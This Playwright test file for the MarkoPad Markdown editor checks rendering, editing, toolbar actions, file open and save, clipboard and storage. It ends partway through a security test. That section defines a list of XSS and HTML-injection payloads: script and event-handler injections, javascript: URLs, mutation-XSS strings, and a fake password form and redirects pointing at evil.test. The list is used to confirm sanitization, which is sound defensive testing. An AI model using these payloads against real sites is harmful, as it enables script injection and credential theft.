// Browser tests for MarkoPad. Requirement IDs in the test names refer to REQUIREMENTS.md.
import { test, expect } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { BASE, PNG, watch, fresh, settle, setText, editorValue, violations, clipboardText } from './helpers.mjs';

const DIST = join(dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'index.html');
const mod = process.platform === 'darwin' ? 'Meta' : 'Control';

let problems;
test.beforeEach(async ({ page }) => { problems = await watch(page); });
test.afterEach(async () => { expect(problems, 'script errors on the page').toEqual([]); });

/* ------------------------------------------------------------------ rendering and layout */

test('MD-1, MD-3: GitHub-Flavored Markdown renders as you type', async ({ page }) => {
  await fresh(page);
  await setText(page, '# Title\n\nSome **bold**, *italic* and ~~gone~~ text. https://example.com\n\n' +
    '- [x] done\n- [ ] todo\n\n| A | B |\n| - | -: |\n| 1 | 2 |\n\n```\ncode here\n```\n\n> quote\n\n---\n');
  const p = page.locator('#preview');
  await expect(p.locator('h1')).toHaveText('Title');
  await expect(p.locator('strong')).toHaveText('bold');
  await expect(p.locator('em')).toHaveText('italic');
  await expect(p.locator('del')).toHaveText('gone');
  await expect(p.locator('table td')).toHaveCount(2);
  await expect(p.locator('td[align="right"]')).toHaveText('2');
  await expect(p.locator('pre code')).toHaveText('code here\n');
  await expect(p.locator('blockquote')).toContainText('quote');
  await expect(p.locator('hr')).toHaveCount(1);
  await expect(p.locator('a.mp-link')).toHaveText('https://example.com');
  const boxes = p.locator('input[type="checkbox"]');
  await expect(boxes).toHaveCount(2);
  expect(await boxes.evaluateAll((els) => els.map((e) => [e.disabled, e.checked]))).toEqual([[true, true], [true, false]]);
});

test('E-7, L-8: status line counts and tab title', async ({ page }) => {
  await fresh(page);
  await expect(page).toHaveTitle(/^Untitled \d\d:\d\d · MarkoPad$/);
  await expect(page.locator('#counts')).toHaveText('0 lines · 0 words · 0 characters');
  const version = JSON.parse(readFileSync(join(dirname(DIST), '..', 'package.json'), 'utf8')).version;
  await expect(page.locator('#version')).toHaveText('v' + version);                       // H-7
  await expect(page.locator('#version')).toBeInViewport();
  await setText(page, '# My *Plan*\n\nhello world');
  await expect(page.locator('#counts')).toHaveText('3 lines · 5 words · 24 characters');
  await expect(page).toHaveTitle('● My Plan · MarkoPad');
  await setText(page, 'just a first line\nand another');
  await expect(page).toHaveTitle('● just a first line · MarkoPad');
});

test('L-2: the divider drags, moves by keyboard, and centres on a double click', async ({ page }) => {
  await fresh(page);
  const width = async () => (await page.locator('#editor-pane').boundingBox()).width;
  expect(Math.round(await width())).toBe(640);
  const box = await page.locator('#divider').boundingBox();
  await page.mouse.move(box.x + box.width / 2, box.y + 200);
  await page.mouse.down();
  await page.mouse.move(400, 300, { steps: 5 });
  await page.mouse.up();
  expect(Math.abs((await width()) - 400)).toBeLessThan(8);
  await page.locator('#divider').focus();
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('ArrowRight');
  expect(Math.abs((await width()) - (400 + 0.04 * 1280))).toBeLessThan(10);
  await page.keyboard.press('End');
  expect(Math.round((await width()) / 12.8)).toBe(90);
  await page.locator('#divider').dblclick();
  expect(Math.round(await width())).toBe(640);
  await expect(page.locator('#divider')).toHaveAttribute('aria-valuenow', '50');
});

test('L-3, L-6: view switch collapses a pane; theme switch works', async ({ page }) => {
  await fresh(page);
  await page.click('#view-edit');
  await expect(page.locator('#preview-pane')).toBeHidden();
  await expect(page.locator('#editor')).toBeVisible();
  await page.click('#view-preview');
  await expect(page.locator('#editor-pane')).toBeHidden();
  await expect(page.locator('#preview-pane')).toBeVisible();
  await page.click('#view-both');
  await expect(page.locator('#editor')).toBeVisible();
  await expect(page.locator('#preview-pane')).toBeVisible();
  const before = await page.evaluate(() => getComputedStyle(document.body).backgroundColor);
  await page.click('#btn-theme');
  expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe('dark');
  expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe(before);
});

test('E-6: the panes scroll together, and the switch turns that off', async ({ page }) => {
  await fresh(page);
  await setText(page, Array.from({ length: 400 }, (_, i) => `Paragraph number ${i}\n`).join('\n'));
  const ratio = (sel) => page.evaluate((s) => { const b = document.querySelector(s); return b.scrollTop / (b.scrollHeight - b.clientHeight); }, sel);
  await page.locator('#editor').evaluate((e) => { e.scrollTop = (e.scrollHeight - e.clientHeight) / 2; });
  await page.waitForTimeout(200);
  expect(Math.abs((await ratio('#preview-scroll')) - 0.5)).toBeLessThan(0.02);
  await page.locator('#preview-scroll').evaluate((e) => { e.scrollTop = e.scrollHeight; });
  await page.waitForTimeout(300);
  expect(await ratio('#editor')).toBeGreaterThan(0.98);
  await page.click('#btn-sync');
  await page.locator('#editor').evaluate((e) => { e.scrollTop = 0; });
  await page.waitForTimeout(200);
  expect(await ratio('#preview-scroll')).toBeGreaterThan(0.98);
});

/* ------------------------------------------------------------------ block-by-block rendering */

const MIXED = '# Mixed\n\nA [ref link][one] and text.\n\n<details>\n<summary>More</summary>\n\nHidden *paragraph*.\n\n- inside\n- the block\n\n</details>\n\n' +
  '<div align="center">\n\n## Centred heading\n\nwith a paragraph\n\n</div>\n\n1. one\n2. two\n\n   continued\n\n> quote\n> more\n\n```js\nconst a = 1;\n\n\nconst b = 2;\n```\n\n' +
  '| a | b |\n| - | - |\n| 1 | 2 |\n\nSetext heading\n---\n\n<!-- a comment -->\n\nlast <kbd>K</kbd>\n\n[one]: https://example.com/ref\n';

test('the preview, built block by block, matches the document rendered as a whole', async ({ page, context }) => {
  await fresh(page);
  const [helpPage] = await Promise.all([context.waitForEvent('page'), page.click('#btn-help')]);
  await helpPage.waitForLoadState();
  const helpText = await helpPage.locator('#editor').inputValue();
  await helpPage.close();
  for (const text of [MIXED, helpText, MIXED + '\n\n' + helpText + '\n\n' + MIXED]) {
    await setText(page, text);
    const diff = await page.evaluate((text) => {
      const BLOCKS = 'h1,h2,h3,h4,h5,h6,p,ul,ol,li,table,thead,tbody,tr,th,td,blockquote,pre,details,summary,hr,div';
      const outline = (root) => {
        root.querySelectorAll('.mp-blocked,.mp-flag,.mp-unavailable-img,img').forEach((n) => n.remove());
        const path = (n) => { let s = ''; for (let e = n; e && e !== root; e = e.parentElement) s = e.tagName + '>' + s; return s; };
        return { tags: [...root.querySelectorAll(BLOCKS)].map(path).join('\n'), text: root.textContent.replace(/\s+/g, '') };
      };
      const whole = new DOMParser().parseFromString(DOMPurify.sanitize(marked.parse(text, { gfm: true })), 'text/html').body;
      const a = outline(document.getElementById('preview').cloneNode(true)), b = outline(whole);
      return { tagsEqual: a.tags === b.tags, textEqual: a.text === b.text, blocks: a.tags.split('\n').length,
        firstDifference: a.tags === b.tags ? '' : a.tags.split('\n').find((line, i) => line !== b.tags.split('\n')[i]) };
    }, text);
    expect(diff.blocks).toBeGreaterThan(30);
    expect(diff, 'structure and text').toMatchObject({ tagsEqual: true, textEqual: true, firstDifference: '' });
  }
  await setText(page, MIXED);
  await expect(page.locator('#preview details p em')).toHaveText('paragraph');
  await expect(page.locator('#preview div[align="center"] h2')).toHaveText('Centred heading');
  await expect(page.locator('#preview a.mp-link').first()).toHaveAttribute('data-mp-url', 'https://example.com/ref');
});

test('after any series of edits the preview equals a fresh rendering of the same text', async ({ page, context }) => {
  await fresh(page);
  const base = (MIXED + '\n\n![pic](https://img-a.test/1.png)\n\n').repeat(6);
  let text = base;
  let seed = 12345;
  const rand = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
  const inserts = ['\n\nnew paragraph\n\n', '**bold** ', '\n# Heading added\n', '\n- item\n', '<details>\n<summary>S</summary>\n\nbody\n\n', '\n\n</details>\n', '\n```\n', '\n\n[one]: https://example.org/changed\n', ' x'];
  await setText(page, text);
  const reference = await context.newPage();
  await fresh(reference);
  for (let step = 0; step < 14; step++) {
    const at = rand(text.length);
    const kind = rand(3);
    if (kind === 0) text = text.slice(0, at) + inserts[rand(inserts.length)] + text.slice(at);
    else if (kind === 1) text = text.slice(0, at) + text.slice(Math.min(text.length, at + 1 + rand(400)));
    else text = text.slice(0, at) + inserts[rand(inserts.length)] + text.slice(Math.min(text.length, at + rand(60)));
    await setText(page, text);
    await reference.goto('about:blank');
    await fresh(reference);
    await setText(reference, text);
    const [got, want] = await Promise.all([page.locator('#preview').innerHTML(), reference.locator('#preview').innerHTML()]);
    expect(got === want, `step ${step}: edited preview differs from a fresh rendering`).toBe(true);
    await expect(page.locator('#img-notice-text')).toHaveText(await reference.locator('#img-notice-text').textContent());
  }
});

/* ------------------------------------------------------------------ editing */

test('E-2, E-3: Tab indents, Shift+Tab outdents, undo still works, Esc then Tab leaves', async ({ page }) => {
  await fresh(page);
  await setText(page, 'line1\nline2');
  await page.locator('#editor').focus();
  await page.keyboard.press(`${mod}+A`);
  await page.keyboard.press('Tab');
  expect(await editorValue(page)).toBe('    line1\n    line2');
  await page.keyboard.press('Shift+Tab');
  expect(await editorValue(page)).toBe('line1\nline2');
  await page.keyboard.press('Tab');
  await page.keyboard.press(`${mod}+Z`);
  expect(await editorValue(page)).toBe('line1\nline2');
  await page.keyboard.press('Escape');
  await page.keyboard.press('Tab');
  expect(await page.evaluate(() => document.activeElement.id)).not.toBe('editor');
  expect(await editorValue(page)).toBe('line1\nline2');
});

test('E-4: Enter continues a list and ends it on an empty item', async ({ page }) => {
  await fresh(page);
  await page.locator('#editor').click();
  await page.keyboard.type('- a');
  await page.keyboard.press('Enter');
  await page.keyboard.type('b');
  await page.keyboard.press('Enter');
  expect(await editorValue(page)).toBe('- a\n- b\n- ');
  await page.keyboard.press('Enter');
  expect(await editorValue(page)).toBe('- a\n- b\n');
  await page.keyboard.type('9. nine');
  await page.keyboard.press('Enter');
  await page.keyboard.type('ten');
  await page.keyboard.press('Enter');
  await page.keyboard.press('Enter');
  await page.keyboard.type('- [x] task');
  await page.keyboard.press('Enter');
  expect(await editorValue(page)).toBe('- a\n- b\n9. nine\n10. ten\n- [x] task\n- [ ] ');
});

/* ------------------------------------------------------------------ formatting toolbar */

async function select(page, from, to) {
  await page.locator('#editor').evaluate((e, [a, b]) => { e.focus(); e.setSelectionRange(a, b); }, [from, to]);
}
const selected = (page) => page.locator('#editor').evaluate((e) => e.value.slice(e.selectionStart, e.selectionEnd));

test('T-2, T-3, T-6: inline buttons wrap, unwrap, take the word under the cursor, and undo', async ({ page }) => {
  await fresh(page);
  await setText(page, 'make this bold please');
  await select(page, 5, 9);
  await page.click('#tb-bold');
  expect(await editorValue(page)).toBe('make **this** bold please');
  expect(await selected(page)).toBe('this');
  await page.click('#tb-bold');                                       // again: taken off
  expect(await editorValue(page)).toBe('make this bold please');
  await select(page, 5, 9);
  await page.click('#tb-italic');
  await page.click('#tb-bold');                                       // italic inside bold, not confused
  expect(await editorValue(page)).toBe('make ***this*** bold please');
  await page.click('#tb-bold');
  expect(await editorValue(page)).toBe('make *this* bold please');
  await select(page, 12, 12);                                         // caret inside "bold", nothing selected
  await page.click('#tb-strike');
  expect(await editorValue(page)).toBe('make *this* ~~bold~~ please');
  await select(page, 5, 5);                                           // caret between a space and a mark: a placeholder
  await page.click('#tb-code');
  expect(await editorValue(page)).toBe('make `code`*this* ~~bold~~ please');
  expect(await selected(page)).toBe('code');
  await page.keyboard.type('npm');
  expect(await editorValue(page)).toBe('make `npm`*this* ~~bold~~ please');
  await page.keyboard.press(`${mod}+Z`);
  await page.keyboard.press(`${mod}+Z`);
  expect(await editorValue(page)).toBe('make *this* ~~bold~~ please');  // each action is one undo step
  await expect(page.locator('#preview del')).toHaveText('bold');
});

test('T-4: line buttons act on every selected line and toggle off', async ({ page }) => {
  await fresh(page);
  await setText(page, 'one\ntwo\n\nthree');
  await select(page, 0, 14);
  await page.click('#tb-ul');
  expect(await editorValue(page)).toBe('- one\n- two\n\n- three');
  await page.click('#tb-ol');                                         // switches kind
  expect(await editorValue(page)).toBe('1. one\n2. two\n\n3. three');
  await page.click('#tb-task');
  expect(await editorValue(page)).toBe('- [ ] one\n- [ ] two\n\n- [ ] three');
  await page.click('#tb-task');                                       // same again: off
  expect(await editorValue(page)).toBe('one\ntwo\n\nthree');
  await page.click('#tb-quote');
  expect(await editorValue(page)).toBe('> one\n> two\n\n> three');
  await page.click('#tb-quote');
  await select(page, 1, 1);                                           // just a caret: the current line
  await page.click('#tb-h2');
  expect(await editorValue(page)).toBe('## one\ntwo\n\nthree');
  await page.click('#tb-h1');                                         // a different level replaces
  expect(await editorValue(page)).toBe('# one\ntwo\n\nthree');
  await page.click('#tb-h1');                                         // the same level removes
  expect(await editorValue(page)).toBe('one\ntwo\n\nthree');
  await expect(page.locator('#preview h1')).toHaveCount(0);
});

test('T-5: link and image leave the address ready to type; a selected address becomes the link', async ({ page }) => {
  await fresh(page);
  await setText(page, 'see the docs here');
  await select(page, 8, 12);
  await page.click('#tb-link');
  expect(await editorValue(page)).toBe('see the [docs](https://) here');
  expect(await selected(page)).toBe('https://');
  await page.keyboard.type('https://example.com/docs');
  expect(await editorValue(page)).toBe('see the [docs](https://example.com/docs) here');
  await setText(page, 'https://example.com');
  await select(page, 0, 19);
  await page.locator('#editor').press(`${mod}+K`);
  expect(await editorValue(page)).toBe('[link text](https://example.com)');
  expect(await selected(page)).toBe('link text');
  await setText(page, '');
  await page.click('#tb-image');
  expect(await editorValue(page)).toBe('![description](https://)');
  expect(await selected(page)).toBe('description');
});

test('T-1: code block, table and dividing line are inserted as blocks', async ({ page }) => {
  await fresh(page);
  await setText(page, 'first\nconst a = 1;\nconst b = 2;\nlast');
  await select(page, 6, 20);
  await page.click('#tb-codeblock');
  expect(await editorValue(page)).toBe('first\n\n```\nconst a = 1;\nconst b = 2;\n```\n\nlast');
  await expect(page.locator('#preview pre code')).toHaveText('const a = 1;\nconst b = 2;\n');
  await setText(page, 'above');
  await select(page, 5, 5);
  await page.click('#tb-table');
  expect(await editorValue(page)).toBe('above\n\n| Column | Column |\n| --- | --- |\n| cell | cell |\n');
  expect(await selected(page)).toBe('Column');
  await select(page, 999, 999);
  await page.click('#tb-hr');
  await expect(page.locator('#preview hr')).toHaveCount(1);
  await expect(page.locator('#preview table')).toHaveCount(1);
});

test('T-7, T-8, T-9: the toolbar hides and shows, keeps that through a reload, and works by keyboard', async ({ page }) => {
  await fresh(page);
  await expect(page.locator('#toolbar')).toBeVisible();
  await page.click('#btn-toolbar');
  await expect(page.locator('#toolbar')).toBeHidden();
  await expect(page.locator('#btn-toolbar')).toHaveAttribute('aria-pressed', 'false');
  await page.waitForTimeout(600);
  await page.reload();
  await expect(page.locator('#toolbar')).toBeHidden();
  await page.click('#btn-toolbar');
  await expect(page.locator('#toolbar')).toBeVisible();
  await setText(page, 'shortcut text');
  await select(page, 0, 8);
  await page.locator('#editor').press(`${mod}+B`);
  await page.locator('#editor').press(`${mod}+I`);
  expect(await editorValue(page)).toBe('***shortcut*** text');
  // Keyboard: Tab onto the toolbar, arrows along it, Enter presses.
  await select(page, 15, 19);
  await page.locator('#tb-bold').focus();
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('ArrowRight');
  await expect(page.locator('#tb-strike')).toBeFocused();
  await page.keyboard.press('Enter');
  expect(await editorValue(page)).toBe('***shortcut*** ~~text~~');
  // A mouse press on a button leaves the text selection where it was.
  await select(page, 3, 11);
  await page.locator('#tb-code').dispatchEvent('pointerdown');
  expect(await selected(page)).toBe('shortcut');
});

/* ------------------------------------------------------------------ in and out */

test('IO-2, IO-4, Q2: Open loads a file; a second file asks before replacing', async ({ page }) => {
  await fresh(page);
  await page.locator('#file-input').setInputFiles({ name: 'notes.md', mimeType: 'text/markdown', buffer: Buffer.from('# From a file\r\nwindows line\r\n') });
  await expect(page.locator('#preview h1')).toHaveText('From a file');
  expect(await editorValue(page)).toBe('# From a file\nwindows line\n');
  await expect(page).toHaveTitle('notes.md · MarkoPad');
  await page.locator('#file-input').setInputFiles({ name: 'other.txt', mimeType: 'text/plain', buffer: Buffer.from('second') });
  await expect(page.locator('#dlg')).toBeVisible();
  await expect(page.locator('#dlg-title')).toHaveText('Replace the current document?');
  await page.getByRole('button', { name: 'Cancel' }).click();
  expect(await editorValue(page)).toBe('# From a file\nwindows line\n');
  await page.locator('#file-input').setInputFiles({ name: 'other.txt', mimeType: 'text/plain', buffer: Buffer.from('second') });
  await page.getByRole('button', { name: 'Replace' }).click();
  await expect(page.locator('#editor')).toHaveValue('second');
  await expect(page).toHaveTitle('other.txt · MarkoPad');
});

test('IO-2: a file that is not text is refused', async ({ page }) => {
  await fresh(page);
  await page.locator('#file-input').setInputFiles({ name: 'photo.png', mimeType: 'image/png', buffer: PNG });
  await expect(page.locator('#dlg-title')).toHaveText('That does not look like a text file');
  await page.getByRole('button', { name: 'OK' }).click();
  expect(await editorValue(page)).toBe('');
});

test('IO-3: dropping a file on the page opens it', async ({ page }) => {
  await fresh(page);
  await page.evaluate(() => {
    const dt = new DataTransfer();
    dt.items.add(new File(['# Dropped in\n'], 'dropped.md', { type: 'text/markdown' }));
    window.dispatchEvent(new DragEvent('dragenter', { dataTransfer: dt, bubbles: true, cancelable: true }));
    window.dispatchEvent(new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true }));
  });
  await expect(page.locator('#preview h1')).toHaveText('Dropped in');
  await expect(page.locator('#drop-overlay')).toBeHidden();
  await expect(page).toHaveTitle('dropped.md · MarkoPad');
});

test('IO-8, IO-12, Q1: download Markdown, name from the heading, clears "unsaved"', async ({ page }) => {
  await fresh(page);
  await setText(page, '# Trip: plan / v2?\n\nbody');
  await expect(page).toHaveTitle(/^● /);
  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('#editor').press(`${mod}+S`)]);
  expect(dl.suggestedFilename()).toBe('Trip-plan-v2.md');
  expect(readFileSync(await dl.path(), 'utf8')).toBe('# Trip: plan / v2?\n\nbody');
  await expect(page).toHaveTitle('Trip: plan / v2? · MarkoPad');
  await setText(page, 'no heading here');
  await page.click('#btn-download');
  const [dl2] = await Promise.all([page.waitForEvent('download'), page.click('#act-save-md')]);
  expect(dl2.suggestedFilename()).toBe('untitled.md');
});

test('IO-9: the downloaded web page is self-contained and has no script', async ({ page, context }) => {
  await fresh(page);
  await setText(page, '# Report\n\n[site](https://example.com/a) and [top](#report) and [rel](x.md)\n\n' +
    '![remote](https://img-a.test/1.png) ![rel](pics/cat.png)\n\n<script>alert(1)</script><img src=x onerror=alert(1)>');
  await page.click('#btn-download');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('#act-save-html')]);
  expect(dl.suggestedFilename()).toBe('Report.html');
  const html = readFileSync(await dl.path(), 'utf8');
  expect(html).not.toMatch(/<script/i);
  expect(html).not.toMatch(/onerror|javascript:|data-mp-/i);
  expect(html).toContain('<h1 id="report">Report</h1>');
  expect(html).toContain('<a href="https://example.com/a" rel="noopener noreferrer">site</a>');
  expect(html).toContain('<a href="#report">top</a>');
  expect(html).toContain('<img src="https://img-a.test/1.png" alt="remote" referrerpolicy="no-referrer">');   // Q3
  expect(html).toContain('[image: rel]');
  expect(html).toContain("default-src 'none'");
  // It really displays on its own, and its policy lets nothing run.
  let imageRequests = 0;
  await context.route('https://img-a.test/**', (r) => { imageRequests++; r.fulfill({ contentType: 'image/png', body: PNG }); });
  const viewer = await context.newPage();
  await viewer.setContent(html);
  await expect(viewer.locator('h1')).toHaveText('Report');
  expect(await viewer.evaluate(() => getComputedStyle(document.querySelector('h1')).borderBottomStyle)).toBe('solid');
  await viewer.close();
});

// The WebKit build used for testing keeps only plain text on its clipboard (even its own
// select-and-copy pastes back unformatted), so formatted copy can be checked in Chromium and
// Firefox only. Plain-text copies are checked in all three.
test('IO-5, IO-6, IO-7: copy as Markdown, as HTML code and as formatted text', async ({ page, context, browserName }) => {
  if (browserName === 'chromium') await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  await fresh(page);
  await setText(page, '# Hi\n\n**bold** [l](https://example.com)');
  await page.click('#btn-copy'); await page.click('#act-copy-md');
  await expect(page.locator('#status-msg')).toHaveText('Markdown copied');
  expect(await clipboardText(page, browserName)).toBe('# Hi\n\n**bold** [l](https://example.com)');
  await page.click('#btn-copy'); await page.click('#act-copy-html');
  await expect(page.locator('#status-msg')).toHaveText('HTML copied');
  expect(await clipboardText(page, browserName)).toContain('<h1 id="hi">Hi</h1>');
  await page.click('#btn-copy'); await page.click('#act-copy-rich');
  await expect(page.locator('#status-msg')).toHaveText('Formatted text copied');
  if (browserName === 'webkit') {
    // All that can be seen here is the plain-text half of the formatted copy.
    expect(await clipboardText(page, browserName)).toBe('# Hi\n\n**bold** [l](https://example.com)');
    return;
  }
  const rich = await page.evaluate(async () => {
    const [item] = await navigator.clipboard.read();
    return { types: item.types, html: await (await item.getType('text/html')).text() };
  });
  expect(rich.types).toEqual(expect.arrayContaining(['text/html', 'text/plain']));
  expect(rich.html).toContain('<strong>bold</strong>');
  expect(rich.html).toContain('href="https://example.com/"');
});

test('N-6: without the modern clipboard, copying falls back and never loads a blocked image', async ({ page, context, browserName }) => {
  if (browserName === 'chromium') await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  let imageRequests = 0;
  await context.route('https://img-a.test/**', (r) => { imageRequests++; r.fulfill({ contentType: 'image/png', body: PNG }); });
  await fresh(page);
  await page.evaluate(() => { window.__clip = navigator.clipboard; Object.defineProperty(navigator, 'clipboard', { value: undefined, configurable: true }); });
  await setText(page, '**bold** ![pic](https://img-a.test/1.png)');
  await page.click('#btn-copy'); await page.click('#act-copy-md');
  await expect(page.locator('#status-msg')).toHaveText('Markdown copied');
  expect(await clipboardText(page, browserName, () => page.evaluate(() => window.__clip.readText()))).toBe('**bold** ![pic](https://img-a.test/1.png)');
  await page.click('#btn-copy'); await page.click('#act-copy-rich');
  await expect(page.locator('#status-msg')).toHaveText('Formatted text copied');
  // The blocked image must be copied as its description and never fetched.
  const plain = await clipboardText(page, browserName, () => page.evaluate(() => window.__clip.readText()));
  expect(plain).toContain('bold');
  expect(plain).toContain('[image: pic]');
  if (browserName !== 'webkit') {
    const html = await page.evaluate(async () => { const [i] = await window.__clip.read(); return (await i.getType('text/html')).text(); });
    expect(html).toMatch(/<strong[^>]*>bold<\/strong>/);     // a selection copy carries the browser's own styling
    expect(html).toContain('[image: pic]');
  }
  expect(imageRequests).toBe(0);
});

test('IO-10: Print prints the formatted document only', async ({ page }) => {
  await fresh(page);
  await setText(page, '# Printed');
  await page.evaluate(() => { window.__printed = 0; window.print = () => { window.__printed++; }; });
  await page.click('#btn-download'); await page.click('#act-print');
  expect(await page.evaluate(() => window.__printed)).toBe(1);
  await page.click('#view-edit');
  await page.emulateMedia({ media: 'print' });
  await expect(page.locator('#preview h1')).toBeVisible();
  await expect(page.locator('#editor')).toBeHidden();
  await expect(page.locator('#bar')).toBeHidden();
  await expect(page.locator('#status')).toBeHidden();
});

test('IO-11, S-4: New asks when there are changes, then wipes text and recovery copy', async ({ page }) => {
  await fresh(page);
  await setText(page, 'secret draft');
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => sessionStorage.getItem('markopad.v1.tab'))).toContain('secret draft');
  await page.click('#btn-new');
  await expect(page.locator('#dlg-title')).toHaveText('Discard this document?');
  await page.getByRole('button', { name: 'Keep working' }).click();
  expect(await editorValue(page)).toBe('secret draft');
  await page.click('#btn-new');
  await page.getByRole('button', { name: 'Discard and start new' }).click();
  await expect(page.locator('#editor')).toHaveValue('');
  await expect(page.locator('#preview')).toBeEmpty();
  expect(await page.evaluate(() => sessionStorage.getItem('markopad.v1.tab'))).not.toContain('secret draft');
});

/* ------------------------------------------------------------------ documents, storage */

test('W-1, W-2, S-1, S-2: tabs are independent; reload keeps the text; nothing permanent is stored', async ({ page, context }) => {
  await fresh(page);
  await setText(page, 'document one');
  const [second] = await Promise.all([context.waitForEvent('page'), page.click('#btn-window')]);
  await second.waitForLoadState();
  await expect(second.locator('#editor')).toHaveValue('');
  expect(new URL(second.url()).hash).toBe('');
  await second.locator('#editor').fill('document two');
  await second.waitForTimeout(600);
  const third = await context.newPage();
  await third.goto('/');
  await expect(third.locator('#editor')).toHaveValue('');
  await page.waitForTimeout(300);
  await page.reload();
  await expect(page.locator('#editor')).toHaveValue('document one');
  await expect(page.locator('#preview')).toHaveText('document one');
  await second.reload();
  await expect(second.locator('#editor')).toHaveValue('document two');
  const stored = await page.evaluate(async () => ({
    local: localStorage.length,
    cookies: document.cookie,
    session: Object.keys(sessionStorage),
    databases: indexedDB.databases ? (await indexedDB.databases()).length : 0,
    caches: 'caches' in window ? (await caches.keys()).length : 0,
  }));
  expect(stored).toEqual({ local: 0, cookies: '', session: ['markopad.v1.tab'], databases: 0, caches: 0 });
});

test('S-3, Q1: leaving warns only when there are edits; paste-to-read is not an edit', async ({ page, context }) => {
  await fresh(page);
  await page.locator('#editor').click();
  await page.keyboard.type('pasted document');
  await expect(page).toHaveTitle(/^● /);
  // Cut everything, then paste it back into the now-empty page: the "paste to read" case.
  await page.keyboard.press(`${mod}+A`);
  await page.keyboard.press(`${mod}+X`);
  await expect(page.locator('#editor')).toHaveValue('');
  await page.keyboard.press(`${mod}+V`);
  await expect(page.locator('#editor')).toHaveValue('pasted document');
  await expect(page).toHaveTitle('pasted document · MarkoPad');
  let prompts = 0;
  page.on('dialog', (d) => { prompts++; d.dismiss(); });
  await page.evaluate(() => { const e = new Event('beforeunload', { cancelable: true }); window.dispatchEvent(e); window.__blocked = e.defaultPrevented; });
  expect(await page.evaluate(() => window.__blocked)).toBe(false);
  await page.keyboard.type(' plus an edit');
  await expect(page).toHaveTitle(/^● /);
  await page.evaluate(() => { const e = new Event('beforeunload', { cancelable: true }); window.dispatchEvent(e); window.__blocked = e.defaultPrevented; });
  expect(await page.evaluate(() => window.__blocked)).toBe(true);
  // And the real thing: the browser raises its own prompt when the tab is closed.
  const other = await context.newPage();
  await fresh(other);
  await other.locator('#editor').click();
  await other.keyboard.type('unsaved work');
  const asked = other.waitForEvent('dialog', { timeout: 5000 });
  await other.close({ runBeforeUnload: true });
  const dialog = await asked;
  expect(dialog.type()).toBe('beforeunload');
  await dialog.accept();
});

test('S-5: a document too large for the recovery copy says so and keeps working', async ({ page }) => {
  await fresh(page);
  await page.evaluate(() => {
    const real = Storage.prototype.setItem;
    Storage.prototype.setItem = function (k, v) { if (v.length > 2000) throw new DOMException('full', 'QuotaExceededError'); return real.call(this, k, v); };
  });
  await setText(page, '# Big\n\n' + 'word '.repeat(1000));
  await page.waitForTimeout(600);
  await expect(page.locator('#recovery')).toHaveText('Recovery copy: off');
  await expect(page.locator('#status-msg')).toContainText('Recovery copy is off');
  await expect(page.locator('#preview h1')).toHaveText('Big');
  await setText(page, 'small again');
  await page.waitForTimeout(600);
  await expect(page.locator('#recovery')).toHaveText('Recovery copy: on');
});

/* ------------------------------------------------------------------ security */

const HOSTILE = [
  '<script>window.__pwned = 1</script>',
  '<img src=x onerror="window.__pwned = 1">',
  '<svg onload="window.__pwned = 1"><circle r=5></circle></svg>',
  '[click](javascript:window.__pwned=1)',
  '<a href="javascript:window.__pwned=1">click</a>',
  '<a href="JaVaScRiPt:window.__pwned=1">click</a>',
  '<a href="&#106;avascript:window.__pwned=1">click</a>',
  '<a href="data:text/html,<script>window.__pwned=1</script>">click</a>',
  '<a href="vbscript:msgbox(1)">click</a>',
  '<iframe src="javascript:parent.__pwned=1"></iframe>',
  '<iframe srcdoc="<script>parent.__pwned=1</script>"></iframe>',
  '<object data="javascript:window.__pwned=1"></object><embed src="javascript:window.__pwned=1">',
  '<form action="https://evil.test/steal"><input name="password" type="password"><button>Sign in</button></form>',
  '<div style="position:fixed;inset:0;background:red;z-index:9999">Your session expired</div>',
  '<style>#bar { display: none } body { background: red }</style>',
  '<link rel="stylesheet" href="https://evil.test/x.css">',
  '<base href="https://evil.test/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.test/">',
  '<details open ontoggle="window.__pwned = 1"><summary>x</summary>y</details>',
  '<input autofocus onfocus="window.__pwned = 1">',
  '<video src=x onerror="window.__pwned = 1"></video><audio src=x onerror="window.__pwned = 1"></audio>',
  '![x](javascript:window.__pwned=1)',
  '<img src="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\' onload=\'window.__pwned=1\'/>">',
  '<div id="editor">x</div><a name="preview">y</a><img name="getElementById" src="data:image/png;base64,AAAA">',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=window.__pwned=1&gt;">',
  '<noscript><p title="</noscript><img src=x onerror=window.__pwned=1>">',
  '<svg><style><img src=x onerror=window.__pwned=1></style></svg>',
  '<p title="</p><img src=x onerror=window.__pwned=1>">text</p>',
  '<a href="https://example.com" onclick="window.__pwned=1" target="_top" class="mp-link" style="color:red" title="https://bank.example">x</a>',
  '<button onclick="window.__pwned=1">Press</button><select><option>a</option></select><textarea>t</textarea>',
  '`<img src=x onerror=window.__pwned=1>` and\n\n```\n<script>window.__pwned=1</script>\n```',
  '<img src="https://evil.test/track.png" srcset="https://evil.test/a.png 1x" style="x" loading="eager">',
];
const OK_TAGS = new Set(('h1 h2 h3 h4 h5 h6 p br hr blockquote pre code em strong del s ins u b i sub sup kbd mark small samp var ' +
  'abbr q cite a img ul ol li dl dt dd table thead tbody tfoot tr th td caption details summary input span div button').split(' '));
const OK_ATTRS = new Set(('src alt align colspan rowspan start type checked disabled open width height lang dir class role tabindex ' +
  'title aria-label referrerpolicy loading decoding').split(' '));

test('X-1, X-2, X-3, X-9: hostile documents cannot run code, style the page or leave markup behind', async ({ page, context }) => {
  const requests = [];
  await context.route('**/*', (route) => {
    const url = route.request().url();
    if (url.startsWith(BASE)) return route.continue();
    requests.push(url);
    return route.abort();
